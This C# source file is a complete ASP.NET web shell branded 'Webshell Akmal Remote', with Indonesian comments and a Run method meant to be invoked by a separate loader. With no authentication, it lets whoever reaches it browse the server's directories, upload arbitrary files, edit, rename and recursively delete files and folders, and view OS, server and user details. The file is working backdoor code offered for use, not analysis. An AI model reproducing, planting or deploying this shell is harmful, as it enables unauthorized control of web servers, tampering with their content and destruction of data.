using System;
using System.Web;
using System.IO;
using System.Text;

public class RemoteShell
{
    // Method ini WAJIB ada agar Loader bisa menjalankannya
    public void Run(HttpContext context)
    {
        context.Response.ContentType = "text/html";
        
        // --- LOGIKA UTAMA SHELL ---
        string action = context.Request.QueryString["action"];
        string dir = context.Request.QueryString["dir"];
        string file = context.Request.QueryString["file"];
        string currentDirectory = dir ?? context.Server.MapPath("~/");

        // Handle POST Actions
        if (context.Request.HttpMethod == "POST")
        {
            string postAction = context.Request.Form["cmd"];

            // 1. Upload File
            if (postAction == "upload" && context.Request.Files.Count > 0)
            {
                HttpPostedFile uploadedFile = context.Request.Files[0];
                string savePath = Path.Combine(currentDirectory, uploadedFile.FileName);
                uploadedFile.SaveAs(savePath);
                context.Response.Redirect(GetUrl(context, "dir", currentDirectory));
            }
            // 2. Save File (Edit)
            else if (postAction == "save" && !string.IsNullOrEmpty(file))
            {
                string content = context.Request.Form["fileContent"];
                File.WriteAllText(file, content);
                context.Response.Redirect(GetUrl(context, "action", "edit", "file", file));
            }
            // 3. Rename File/Folder
            else if (postAction == "rename_submit")
            {
                string targetPath = context.Request.Form["targetPath"];
                string newName = context.Request.Form["newName"];
                if (!string.IsNullOrEmpty(targetPath) && !string.IsNullOrEmpty(newName))
                {
                    string newPath = Path.Combine(Path.GetDirectoryName(targetPath), newName);
                    if (Directory.Exists(targetPath)) Directory.Move(targetPath, newPath);
                    else if (File.Exists(targetPath)) File.Move(targetPath, newPath);
                    context.Response.Redirect(GetUrl(context, "dir", Path.GetDirectoryName(newPath)));
                }
            }
        }

        // Handle GET Actions (Delete)
        if (action == "delete" && !string.IsNullOrEmpty(dir ?? file))
        {
            string targetDelete = dir ?? file;
            if (Directory.Exists(targetDelete)) Directory.Delete(targetDelete, true);
            else if (File.Exists(targetDelete)) File.Delete(targetDelete);
            context.Response.Redirect(GetUrl(context, "dir", Path.GetDirectoryName(targetDelete)));
        }

        // --- TAMPILAN HTML ---
        
        string css = @"
        <style>
            body { font-family: Arial, sans-serif; background: linear-gradient(to right, black, blue, black), linear-gradient(to bottom, black, blue); color: #fff; margin: 0; padding: 0; }
            .container { max-width: 800px; margin: 50px auto; background: rgba(0, 0, 0, 0.8); padding: 20px; border-radius: 10px; }
            .info { margin-bottom: 20px; }
            .info div { margin-bottom: 5px; }
            .directory { color: #00ff00; }
            .file { color: #00bfff; }
            .options { margin-top: 20px; }
            .options a { margin-right: 10px; text-decoration: none; color: #fff; }
            .options a:hover { text-decoration: underline; }
            .file-list { margin-top: 20px; }
            .file-list table { width: 100%; border-collapse: collapse; }
            .file-list th, .file-list td { border: 1px solid #444; padding: 8px; text-align: left; }
            .file-list th { background-color: #333; }
            .edit-file { margin-top: 20px; }
            .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #bbb; }
            textarea { width: 100%; background: #222; color: #fff; border: 1px solid #444; }
        </style>";

        context.Response.Write("<!DOCTYPE html><html><head><title>Webshell Akmal Remote</title>" + css + "</head><body>");
        context.Response.Write("<div class='container'><h1>Webshell Akmal Remote</h1>");

        context.Response.Write("<div class='info'>");
        context.Response.Write("<div><strong>System:</strong> " + Environment.OSVersion + "</div>");
        context.Response.Write("<div><strong>Server:</strong> " + context.Request.ServerVariables["SERVER_SOFTWARE"] + "</div>");
        context.Response.Write("<div><strong>User:</strong> " + Environment.UserName + "</div>");
        context.Response.Write("</div>");

        // Breadcrumb
        context.Response.Write("Directory: ");
        string[] pathParts = currentDirectory.Split(new char[] { Path.DirectorySeparatorChar }, StringSplitOptions.RemoveEmptyEntries);
        string pathBuilder = "";
        foreach (string part in pathParts)
        {
            pathBuilder += part + Path.DirectorySeparatorChar;
            context.Response.Write(string.Format("<a href='?dir={0}'>{1}</a>{2}", context.Server.UrlEncode(pathBuilder), part, Path.DirectorySeparatorChar));
        }

        // Upload Form
        context.Response.Write("<div style='margin-top:15px;'><form method='post' enctype='multipart/form-data'>");
        context.Response.Write("<input type='hidden' name='cmd' value='upload'>");
        context.Response.Write("<input type='file' name='fileUpload'> <input type='submit' value='Upload File'>");
        context.Response.Write("</form></div>");

        // --- TAMPILAN LOGIKA ---
        if (action == "rename" && !string.IsNullOrEmpty(dir ?? file))
        {
            string renamePath = dir ?? file;
            context.Response.Write("<div><h3>Rename: " + Path.GetFileName(renamePath) + "</h3>");
            context.Response.Write("<form method='post'>");
            context.Response.Write("<input type='hidden' name='cmd' value='rename_submit'>");
            context.Response.Write("<input type='hidden' name='targetPath' value='" + renamePath + "'>");
            context.Response.Write("<input type='text' name='newName' placeholder='New Name' value='" + Path.GetFileName(renamePath) + "'> ");
            context.Response.Write("<input type='submit' value='Rename'>");
            context.Response.Write("</form></div>");
        }
        else if (action == "edit" && !string.IsNullOrEmpty(file) && File.Exists(file))
        {
            string fileContent = File.ReadAllText(file);
            context.Response.Write("<div><h3>Edit: " + Path.GetFileName(file) + "</h3>");
            context.Response.Write("<form method='post'>");
            context.Response.Write("<input type='hidden' name='cmd' value='save'>");
            context.Response.Write("<textarea name='fileContent' rows='20'>" + HttpUtility.HtmlEncode(fileContent) + "</textarea><br>");
            context.Response.Write("<input type='submit' value='Save'>");
            context.Response.Write("</form></div>");
        }
        else
        {
            context.Response.Write("<div class='file-list'><table><thead><tr><th>Name</th><th>Size</th><th>Type</th><th>Actions</th></tr></thead><tbody>");
            try {
                string[] directories = Directory.GetDirectories(currentDirectory);
                foreach (string d in directories)
                {
                    DirectoryInfo di = new DirectoryInfo(d);
                    context.Response.Write("<tr>");
                    context.Response.Write(string.Format("<td class='directory'><a href='?dir={0}'>{1}</a></td>", context.Server.UrlEncode(di.FullName), di.Name));
                    context.Response.Write("<td>-</td><td>Directory</td>");
                    context.Response.Write(string.Format("<td class='options'><a href='?action=rename&dir={0}'>Rename</a> <a href='?action=delete&dir={0}'>Delete</a></td>", context.Server.UrlEncode(di.FullName)));
                    context.Response.Write("</tr>");
                }
                string[] files = Directory.GetFiles(currentDirectory);
                foreach (string f in files)
                {
                    FileInfo fi = new FileInfo(f);
                    context.Response.Write("<tr>");
                    context.Response.Write(string.Format("<td class='file'>{0}</td>", fi.Name));
                    context.Response.Write(string.Format("<td>{0} bytes</td>", fi.Length));
                    context.Response.Write(string.Format("<td>{0}</td>", fi.Extension));
                    context.Response.Write(string.Format("<td class='options'><a href='?action=edit&file={0}'>Edit</a> <a href='?action=rename&file={0}'>Rename</a> <a href='?action=delete&file={0}'>Delete</a></td>", context.Server.UrlEncode(fi.FullName)));
                    context.Response.Write("</tr>");
                }
            } catch (Exception ex) {
                context.Response.Write("<tr><td colspan='4'>Error: " + ex.Message + "</td></tr>");
            }
            context.Response.Write("</tbody></table></div>");
        }

        context.Response.Write("<div class='footer'>&copy; Akmal Remote Shell</div>");
        context.Response.Write("</div></body></html>");
    }

    // Helper URL
    private string GetUrl(HttpContext context, params string[] queryParams)
    {
        var qs = HttpUtility.ParseQueryString("");
        for (int i = 0; i < queryParams.Length; i += 2)
        {
            if (i + 1 < queryParams.Length) qs[queryParams[i]] = queryParams[i + 1];
        }
        return context.Request.Url.AbsolutePath + "?" + qs.ToString();
    }
}
